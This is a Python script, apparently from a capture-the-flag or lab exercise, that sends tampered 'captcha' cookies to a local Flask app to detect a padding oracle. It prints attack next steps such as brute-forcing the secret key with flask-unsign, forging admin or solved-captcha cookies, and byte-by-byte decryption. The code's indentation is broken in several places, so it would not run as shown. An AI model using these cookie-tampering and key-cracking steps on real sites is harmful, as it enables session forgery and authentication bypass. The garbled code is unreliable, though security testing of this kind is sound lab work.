import requests
import time
import base64

# Target URL from context
target_url = "http://127.0.0.1:32834"

print("=" * 80)
print("COOKIE VALIDATION TESTING - PADDING ORACLE DETECTION")
print("=" * 80)

# Cookie modifications based on earlier analysis
cookies_to_test = {
    "original": "2mArom13+gd4q/dQTQu4aFVpwOkejaqPtWuV0Kyn2ls=",
    "modify_last_byte_1": "2mArom13-gd4q_dQTQu4aFVpwOkejaqPtWuV0Kyn2lw",
    "modify_last_byte_2": "2mArom13-gd4q_dQTQu4aFVpwOkejaqPtWuV0Kyn2l0",
    "modify_second_last": "2mArom13-gd4q_dQTQu4aFVpwOkejaqPtWuV0Kyn21s",
    "remove_block": "2mArom13-gd4q_dQTQu4aA"
}

# Test each cookie variant
results = {}
    
for test_name, cookie_value in cookies_to_test.items():
    print(f"\n{'='*60}")
    print(f"Testing: {test_name}")
    print(f"Cookie value: {cookie_value}")
    
    # Prepare cookies
    cookies = {
        'captcha': cookie_value,
        'session': 'eyJjc3JmX3Rva2VuIjoiMTZjODc0NzE5OGJkYmQ0NDk0OGVjNGU2ZDlkYmNkMTA5MjQwMDE1MyJ9.aVsvAw.blOld64SDuhg3c1d3IRdiGsgjXw'
    }
    
    try:
        start_time = time.time()
        response = requests.get(target_url, cookies=cookies, timeout=10)
        end_time = time.time()
        
        response_time = (end_time - start_time) * 1000  # ms
        
        print(f"Status Code: {response.status_code}")
        print(f"Response Time: {response_time:.2f}ms")
        print(f"Content Length: {len(response.text)} bytes")
        print(f"Server Headers: {dict(response.headers)}")
        print(f"Response Preview (first 200 chars):")
        print(f"{response.text[:200]}...")
        
        # Check for error indicators
        error_indicators = [
            'error', 'invalid', 'exception', 'padding', 'crypto',
            'bad', 'failed', 'corrupt', 'malformed', 'signature'
        ]
        
        lower_text = response.text.lower()
        found_errors = []
        for indicator in error_indicators:
            if indicator in lower_text:
                found_errors.append(indicator)
        
        if found_errors:
            print(f"\n⚠️  Error indicators found: {found_errors}")
        else:
            print(f"\n✓ No obvious error indicators in response")
        
        # Analyze response details
        analysis = {
            'status_code': response.status_code,
            'response_time': response_time,
            'content_length': len(response.text),
            'has_error_indicators': bool(found_errors),
            'error_types': found_errors,
            'response_preview': response.text[:300]
    }
        
        results[test_name] = analysis
        
    except requests.exceptions.Timeout:
        print(f"[!] TIMEOUT after 10 seconds")
        results[test_name] = {
            'status_code': 'TIMEOUT',
            'response_time': '>10000',
            'error': 'Timeout'
        }
    except Exception as e:
    print(f"[!] Error: {e}")
        results[test_name] = {
  'status_code': 'ERROR',
  'error': str(e)
        }

print(f"\n{'='*80}")
print("SUMMARY & COMPARISON")
print("="*80)

# Compare responses for oracle indicators
print("\nStatus Code Comparison:")
for name, result in results.items():
    status = result.get('status_code', 'UNKNOWN')
    print(f"  {name:20}: {status}")

print("\nResponse Time Comparison:")
for name, result in results.items():
    time_val = result.get('response_time', 0)
print(f"  {name:20}: {time_val}")

print("\nContent Length Comparison:")
for name, result in results.items():
    length = result.get('content_length', 0)
    print(f"  {name:20}: {length} bytes")

print("\nError Indicator Analysis:")
for name, result in results.items():
    has_errors = result.get('has_error_indicators', False)
    error_types = result.get('error_types', [])
    print(f"  {name:20}: {'YES - ' + ', '.join(error_types) if has_errors else 'NO'}")

# Padding Oracle Indicators
def analyze_padding_oracle(results):
    print(f"\n{'='*60}")
    print("PADDING ORACLE INDICATOR ANALYSIS")
    print("="*60)
    
    baseline = results.get('original', {})
    baseline_status = baseline.get('status_code')
    baseline_time = baseline.get('response_time', 0)
    
    indicators = []
    
    # Check for different status codes
    for name, result in results.items():
        if name == 'original':
  continue
            if result.get('status_code') != baseline_status:
               indicators.append(f"Status code change: {name}")
    
    # Check for timing differences > 500ms
    for name, result in results.items():
        if name == 'original':
     continue
   time_diff = abs(result.get('response_time', 0) - baseline_time)
        if time_diff > 500:
      indicators.append(f"Timing anomaly: {name} (+{time_diff:.0f}ms)")
    
    # Check for error messages
    for name, result in results.items():
        if name == 'original':
    continue
        if result.get('has_error_indicators'):
     error_types = result.get('error_types', [])
            indicators.append(f"Error messages in {name}: {error_types}")
    
    # Check for content length variations
    baseline_len = baseline.get('content_length', 0)
    for name, result in results.items():
        if name == 'original':
          continue
        length_diff = abs(result.get('content_length', 0) - baseline_len)
        if length_diff > 100:
     indicators.append(f"Content length change: {name} (Δ{length_diff} bytes)")
    
    if indicators:
        print(f"🚨 PADDING ORACLE LIKELY - Found {len(indicators)} indicators:")
        for indicator in indicators:
     print(f"  • {indicator}")
    else:
        print("⚠️  No clear padding oracle indicators detected")
        print("Possible reasons:")
        print("  1. Error handling is uniform")
  print("  2. Application handles invalid cookies silently")
        print("  3. Cookie is signed, not encrypted")
  
    return bool(indicators)

oracle_detected = analyze_padding_oracle(results)

print(f"\n{'='*80}")
print("CONCLUSIONS & RECOMMENDATIONS")
print("="*80)

print("\nCookie Structure Analysis:")
print("• Cookie is 32 bytes (2 blocks of AES)")
print("• Contains URL-safe base64 with padding")
print("• Medium entropy (4.94 bits/byte) - uncertain structure")
print("• Last byte (0x5b=91) is NOT valid PKCS#7 padding")
print("→ This suggests SIGNED COOKIE, not encrypted")

print("\nCookie Format Assessment:")
print("Flask itsdangerous typically uses:")
print("1. URLSafeTimedSerializer: base64(timestamp.payload.signature)")
print("2. If encrypted: AES-CBC with proper PKCS#7 padding")
print("3. Current cookie format matches signed cookie pattern")

print("\nTesting Recommendations:")
print("1. Further test with flask-unsign to verify signature format")
print("2. Try to guess/brute-force the secret key")
print("3. If secret key found, craft arbitrary cookies")
print("4. For padding oracle: Need to confirm cookie is encrypted")
print("5. Try more aggressive padding modifications")

print(f"\nDetected Vulnerability Indicators:")
if oracle_detected:
    print("🚨 PADDING ORACLE DETECTED!")
    print("→ Application shows differential responses to padding modifications")
    print("→ Can exploit to leak plaintext or forge cookies")
else:
    print("⚠️  Padding oracle not confirmed")
    print("→ Cookie may be signed (HMAC) rather than encrypted")
    print("→ Focus on secret key compromise instead")

print("\nNext Testing Phase:")
print("1. Use flask-unsign or similar to attempt secret key discovery")
print("2. Test with known Flask secret key wordlists")
print("3. If secret found, craft admin/solved captcha cookies")
print("4. If padding oracle confirmed, implement byte-by-byte decryption")

print("\n" + "=" * 80)

